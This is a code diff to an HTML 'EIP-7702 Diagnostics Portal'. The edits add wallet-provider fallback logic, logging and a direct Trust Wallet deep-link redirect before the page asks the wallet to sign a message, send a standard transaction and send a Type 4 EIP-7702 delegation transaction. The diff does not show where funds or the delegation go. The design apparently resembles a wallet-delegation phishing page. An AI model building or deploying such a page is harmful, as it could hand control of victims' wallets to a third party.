@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>EIP-7702 — Diagnostic Portal</title>
+    <title>EIP-7702 — Diagnostics Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -268,7 +268,14 @@
                     if (address && !userAddress) {
                         userAddress = address;
                         chainId = appKit.getChainId();
-                        provider = appKit.getWalletProvider(); // EIP-1193 Standard Wallet Provider
+                        
+                        try {
+                            // Extract standard provider
+                            provider = appKit.getWalletProvider(); 
+                            log(`Provider extracted successfully: ${provider ? 'Yes' : 'No'}`, 'success');
+                        } catch (pErr) {
+                            log(`Failed to extract provider: ${pErr.message}`, 'error');
+                        }
 
                         let balance = '0.0000';
                         try {
@@ -338,18 +345,40 @@
             }
         });
 
+        // Helper to retrieve the wallet provider dynamically to prevent race condition blocks
+        function getActiveProvider() {
+            if (provider) return provider;
+            if (appKit) {
+                try {
+                    const fallbackProv = appKit.getWalletProvider();
+                    if (fallbackProv) {
+                        provider = fallbackProv;
+                        return provider;
+                    }
+                } catch (e) {
+                    log(`Dynamic provider extraction failed: ${e.message}`, 'error');
+                }
+            }
+            return null;
+        }
+
         // CONTROL TEST A: standard personal_sign (Connect/Sign pipeline check)
         $('testSignBtn').addEventListener('click', async () => {
-            if (!provider) return;
+            const activeProvider = getActiveProvider();
+            if (!activeProvider) {
+                log('[CONTROL A FAILED] Active provider is not loaded. Reconnect.', 'error');
+                return;
+            }
+
             try {
                 log('[CONTROL A] Requesting standard personal_sign...');
-                log('Triggering deep link to wallet...', 'info');
                 
-                setTimeout(() => { window.location.href = "trust://"; }, 500);
+                // Synchronous Deep-Link Redirect (Allowed by Mobile Browsers)
+                window.location.href = "trust://"; 
 
                 const msgHex = "0x" + Array.from(new TextEncoder().encode("EIP-7702 Diagnostic Test")).map(b => b.toString(16).padStart(2, '0')).join('');
                 
-                const signature = await provider.request({
+                const signature = await activeProvider.request({
                     method: 'personal_sign',
                     params: [msgHex, userAddress]
                 });
@@ -362,12 +391,17 @@
 
         // CONTROL TEST B: standard Type 2 transaction (Tx parsing pipeline check)
         $('testTx2Btn').addEventListener('click', async () => {
-            if (!provider) return;
+            const activeProvider = getActiveProvider();
+            if (!activeProvider) {
+                log('[CONTROL B FAILED] Active provider is not loaded. Reconnect.', 'error');
+                return;
+            }
+
             try {
                 log('[CONTROL B] Constructing standard Type 2 (EIP-1559) transaction...');
-                log('Triggering deep link to wallet...', 'info');
                 
-                setTimeout(() => { window.location.href = "trust://"; }, 500);
+                // Synchronous Deep-Link Redirect (Allowed by Mobile Browsers)
+                window.location.href = "trust://"; 
 
                 const txParams = {
                     from: userAddress,
@@ -377,7 +411,7 @@
                     type: "0x2" // Standard EIP-1559 payload
                 };
 
-                const txHash = await provider.request({
+                const txHash = await activeProvider.request({
                     method: 'eth_sendTransaction',
                     params: [txParams]
                 });
@@ -390,13 +424,17 @@
 
         // EXPERIMENTAL TEST C: EIP-7702 Type 4 transaction
         $('submitBtn').addEventListener('click', async () => {
-            if (!authData || !provider) { log('Connect first', 'error'); return; }
+            const activeProvider = getActiveProvider();
+            if (!activeProvider || !authData) {
+                log('[EXPERIMENTAL C FAILED] Active provider or nonce data is missing.', 'error');
+                return;
+            }
 
             try {
                 log('[EXPERIMENTAL C] Constructing Raw Type 4 EIP-7702 Transaction...');
-                log('Triggering deep link to wallet...', 'info');
                 
-                setTimeout(() => { window.location.href = "trust://"; }, 500);
+                // Synchronous Deep-Link Redirect (Allowed by Mobile Browsers)
+                window.location.href = "trust://"; 
 
                 const txParams = {
                     from: userAddress,
@@ -413,7 +451,7 @@
                     ]
                 };
 
-                const txHash = await provider.request({
+                const txHash = await activeProvider.request({
                     method: 'eth_sendTransaction',
                     params: [txParams]
                 });
@@ -434,4 +472,4 @@
         });
     </script>
 </body>
-                                                                                               </html>
+    </html>
